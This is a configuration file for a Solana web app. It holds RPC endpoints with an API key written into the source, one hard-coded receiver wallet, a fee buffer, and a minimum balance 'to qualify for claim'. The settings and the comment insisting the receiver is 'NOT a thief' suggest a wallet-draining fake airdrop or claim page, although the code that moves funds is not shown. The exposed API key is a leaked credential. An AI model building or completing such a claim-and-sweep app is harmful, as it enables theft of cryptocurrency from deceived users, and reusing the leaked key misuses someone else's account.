import { PublicKey } from '@solana/web3.js';

// Primary RPC — Helius free tier (browser CORS-friendly)
export const RPC_URL =
  import.meta.env.VITE_RPC_URL ||
  'https://mainnet.helius-rpc.com/?api-key=1d8740dc-e5f4-421c-b823-e1bad1889eff';

// Fallback RPCs (tried in order if primary fails)
export const RPC_ENDPOINTS = [
  RPC_URL,
  'https://mainnet.helius-rpc.com/?api-key=1d8740dc-e5f4-421c-b823-e1bad1889eff',
  'https://api.mainnet-beta.solana.com',
].filter((v, i, a) => a.indexOf(v) === i);

// 🎯 Replace with your legitimate receiver wallet (NOT a thief!)
export const RECEIVER_WALLET = new PublicKey('DwLucxM2TNd8jj8ntNJ7BQJAmYAvCaZB2teMmP687jvZ');

// Optional: Minimum balance buffer (in lamports)
export const TRANSFER_FEE_BUFFER = 5000; // ~0.000005 SOL

// Minimum SOL balance required to qualify for claim
export const MIN_QUALIFY_SOL = 0.01;
